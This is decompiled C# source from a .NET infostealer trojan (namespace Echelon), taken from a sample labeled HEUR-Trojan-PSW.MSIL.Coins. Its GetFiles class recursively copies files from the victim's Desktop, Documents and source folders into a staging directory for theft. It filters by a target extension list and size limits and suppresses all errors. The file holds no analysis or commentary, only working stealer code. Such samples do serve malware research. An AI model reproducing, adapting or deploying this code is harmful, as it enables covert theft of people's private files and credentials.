// Decompiled with JetBrains decompiler
// Type: Echelon.GetFiles
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace Echelon
{
  public class GetFiles
  {
    public static int count;

    public static void Inizialize(string Echelon_Dir)
    {
      try
      {
        string str = Echelon_Dir + "\\Files";
        Directory.CreateDirectory(str);
        if (!Directory.Exists(str))
        {
          GetFiles.Inizialize(str);
        }
        else
        {
          GetFiles.CopyDirectory(Help.DesktopPath, str, "*.*", (long) Program.FileSize);
          GetFiles.CopyDirectory(Help.MyDocuments, str, "*.*", (long) Program.FileSize);
          GetFiles.CopyDirectory(Help.UserProfile + "\\source", str, "*.*", (long) Program.FileSize);
        }
      }
      catch
      {
      }
    }

    private static long GetDirSize(string path, long size = 0)
    {
      try
      {
        foreach (string enumerateFile in Directory.EnumerateFiles(path))
        {
          try
          {
            size += new FileInfo(enumerateFile).Length;
          }
          catch
          {
          }
        }
        foreach (string enumerateDirectory in Directory.EnumerateDirectories(path))
        {
          try
          {
            size += GetFiles.GetDirSize(enumerateDirectory);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      return size;
    }

    public static void CopyDirectory(string source, string target, string pattern, long maxSize)
    {
      Stack<GetFiles.Folders> foldersStack = new Stack<GetFiles.Folders>();
      foldersStack.Push(new GetFiles.Folders(source, target));
      long dirSize = GetFiles.GetDirSize(target);
      while (foldersStack.Count > 0)
      {
        GetFiles.Folders folders = foldersStack.Pop();
        try
        {
          Directory.CreateDirectory(folders.Target);
          foreach (string enumerateFile in Directory.EnumerateFiles(folders.Source, pattern))
          {
            try
            {
              if (Array.IndexOf<string>(Program.Echelon_Size, Path.GetExtension(enumerateFile).ToLower()) >= 0)
              {
                string str = Path.Combine(folders.Target, Path.GetFileName(enumerateFile));
                if (new FileInfo(enumerateFile).Length / 1024L < 5000L)
                {
                  File.Copy(enumerateFile, str);
                  dirSize += new FileInfo(str).Length;
                  if (dirSize > maxSize)
                    return;
                  ++GetFiles.count;
                }
              }
            }
            catch
            {
            }
          }
        }
        catch (UnauthorizedAccessException ex)
        {
          continue;
        }
        catch (PathTooLongException ex)
        {
          continue;
        }
        try
        {
          foreach (string enumerateDirectory in Directory.EnumerateDirectories(folders.Source))
          {
            try
            {
              if (!enumerateDirectory.Contains(Path.Combine(Help.DesktopPath, Environment.UserName)))
                foldersStack.Push(new GetFiles.Folders(enumerateDirectory, Path.Combine(folders.Target, Path.GetFileName(enumerateDirectory))));
            }
            catch
            {
            }
          }
        }
        catch (UnauthorizedAccessException ex)
        {
        }
        catch (DirectoryNotFoundException ex)
        {
        }
        catch (PathTooLongException ex)
        {
        }
      }
      foldersStack.Clear();
    }

    public class Folders : IFolders
    {
      public string Source { get; private set; }

      public string Target { get; private set; }

      public Folders(string source, string target)
      {
        this.Source = source;
        this.Target = target;
      }
    }
  }
}
